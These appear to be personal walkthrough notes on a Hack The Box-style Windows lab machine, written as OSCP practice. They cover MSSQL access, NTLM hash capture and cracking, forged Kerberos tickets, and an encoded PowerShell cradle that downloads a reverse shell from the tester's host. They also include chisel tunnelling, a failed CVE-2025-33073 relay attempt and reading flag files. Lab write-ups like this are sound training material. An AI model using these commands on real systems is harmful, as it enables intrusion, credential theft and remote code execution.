
```IP
10.129.50.149
```

```User
scott
```
```Password
Sm230#C5NatH
```

----

ports

```
nmap -p- -n -Pn -vv --min-rate=5000 10.129.50.149 -oG network/nmap_ports.txt
```

01


service

```
nmap -p1433 -sCV -Pn --min-rate=5000 10.129.50.149 -oN network/nmap_service.txt
```

02


Validate credentials

```
nxc mssql 10.129.50.149 -u 'scott' -p 'Sm230#C5NatH' --local-auth
```

03

```Domain
signed.htb
```
```Hostname
DC01
```
```OS
Microsoft SQL Server 2022 16.00.1000.00
```


Access MSSQL

```
impacket-mssqlclient 'scott:Sm230#C5NatH@signed.htb'
```

04


```
enum_db
```

05


Capture hash

Start responder

```
sudo responder -I tun0
```

Call inexistent resource on local

```
xp_dirtree \\10.10.14.132\something
```

06

Saved to file

Cracking

```
hashcat -m 5600 signed.htb.mssqlsvc.hash rockyou.txt
```

07

New creds

```Account
mssqlsvc
```
```Password
purPLE9795!@
```

Access MSSQL

```
impacket-mssqlclient signed/mssqlsvc:'purPLE9795!@'@10.129.50.149 -windows-auth
```

08

```
enable_xp_cmdshell
```

09

```
enum_impersonate
```

10

Cant be impersonated

Enumerating Domain Users

```
nxc mssql 10.129.50.149 -u 'mssqlsvc' -p 'purPLE9795!@' --rid-brute
```

11

```
cat intelligence/users.txt | awk '{print $6}' | tee intelligence/users.txt
```

----

Getting Domain SID

```
select SUSER_SID('signed\administrator')
```

`'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'`

```
python3
from impacket.dcerpc.v5.dtypes import SID
raw_sid = '0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'
admin_sid = SID(bytes.fromhex(raw_sid))
admin_sid.formatCanonical()
```

12

`S-1-5-21-4088429403-1159899800-2753317549-500`

Script to create ticket with ticketer.py

Need:
- SPN
- domain-sid
- NT Hash
- group ID
- User ID

Convert password to NT hash

```
echo -n 'purPLE9795!@' | iconv -t utf-16le | openssl md4 -provider legacy
```

13

`ef699384c3285c54128a3ee1ddb1a0cc`

Ready

14

```
./ticketgen.sh
```

15

Access MSSQL as administrator with ticket

```
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -windows-auth dc01.signed.htb
```

16

Still guest

```
enum_logins
```

17

Figure out what SID identifyer IT Group has

On MSSQL shell

```
select SUSER_SID('signed\IT')
```

`'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'`

Using same logic as before with IT SID

18

`S-1-5-21-4088429403-1159899800-2753317549-1105`

IT = 1105

Adding IT identifyer to groups in script to create new ticket

19

Access MSSQL with new ticket

```
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -windows-auth dc01.signed.htb
```

20

Now connected as dbo (database owner), with sysadmin rights

Enable cmdshell

```
enable_xp_cmdshell
```

21

```
xp_cmdshell <cmd>
```

22

Prepare Reverse Shell

Make www/ dir, copy Invoke-PowershellTcpOneLine.ps1, edit, rename shell.ps1

23

Make base64 cradle

```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.132:8000/shell.ps1')" | iconv -t utf16le | base64 -w0
```
`SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMwAyADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=`

Set tty listener with rlwrap

```
rlwrap nc -nlvp 9001
```

Serve files on www

```
python3 -m http.server
```

On MSSQL shell trigger connection

```
xp_cmdshell powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMwAyADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```

Obtained the shell

```
whoami; ipconfig; type user.txt
```

24+

----

Creating Tunnel/Proxy to access the internal ports

*(Fist time practicing this. Referenced: IppSec - https://www.youtube.com/watch?v=d7FCnR6YS_E)*

Using chisel https://github.com/jpillora/chisel/releases

Move the .exe to www/

On linux

```
/opt/tools/chisel/chisel_linux server --reverse -p 9000 -socks5
```

25

On windows shell, change directory to \programdata

```
.\chisel.exe client 10.10.14.132:9000 R:socks
```

26

Edit proxy config

```
sudo nano /etc/proxychains4.conf
```

Add

```
socks5    127.0.0.1 1080
```

Save

27

Set proxy chain

```
proxychains nc -zv 10.129.50.149 445
```

28


CVE-2025-33073:
https://www.synacktiv.com/sites/default/files/2025-06/x33fcon-reflective_relay-cve-2025-33073.pdf

29

Using krbrelayx https://github.com/dirkjanm/krbrelayx dnstool.py
Clone, may need venv and install impacket. Not necessary for me on Kali.

Deep explaination of the attack on DarkCorp machine resolution by IppSec: https://youtu.be/miOE_yYh1JY?si=zzoMxJDvVdCwcxTu

```
proxychains python3 dnstool.py -u 'SIGNED\MSSQLSVC' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.14.132 10.129.50.149
```

30

Switch to root

Make sure impacket ntlmrelayx version is >= 13

31

```
proxychains impacket-ntlmrelayx -t winrms://10.129.50.149 -smb2support
```

`[*] Servers started, waiting for connections`

Coerce to trigger a connection from dc01 using Petitpotam

```
proxychains nxc smb dc01.signed.htb -u 'mssqlsvc' -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petitpotam
```

Relay dont seem to be working so Im getting no connection back.

Even though the techniques/tools used are standard OffSec, this specific exploit seems to be beyond what OSCP+ is about, so I wont keep debugging and wasting time on this.

A few concrete reasons: (according to Claude AI, model Opus 4.8)

"
- OSCP doesn't test recent CVEs / 0days. The exam is built around stable, well-documented, repeatable techniques. A June-2025 conference-disclosed CVE that Microsoft patched days later is exactly the kind of thing OffSec avoids — it's a moving target and unfair to examine on.
- It's patched. The exam environment reflects configurations that exist because of misconfiguration or by-design abuse, not a specific unpatched reflection bug.
- It's genuinely advanced. Marshalled target-info structures, LSASS token reflection, reversing DLLs in IDA to find the primitive — that's OSEP/red-team-research territory, well above the "apply fundamental course learnings" bar OSCP sets.
"

---

Trying another way

Access MSSQL again with the administrator ticket

```
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -windows-auth dc01.signed.htb
```

```
select SUSER_SID('mssqlsvc')
```

`'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'`

32

mssqlsvc = 1103

Edit ticketget.sh and run

33

```
./ticketgen.sh
```

`[*] Saving ticket in mssqlsvc.ccache`

Connect

```
KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient -k -windows-auth dc01.signed.htb
```

Reading files directly from MSSQL shell

```
select * FROM openrowset(BULK 'c:\users\administrator\desktop\root.txt', SINGLE_CLOB) as CONTENTS;
```

34

Should also be able to read powershell history where a command leaks the administrator password 

```
select * FROM openrowset(BULK 'c:\users\administrator\appdata\roaming\microsoft\windows\powershell\PSReadline\consolehost_history.txt', SINGLE_CLOB) as CONTENTS;
```

But Im getting errors

35

Anyways, the root.txt flag was obtained and thats the actual written goal.

Ending the test here since I already have the proof and more importantly  new techniques learned to settle and add to my methodology. 
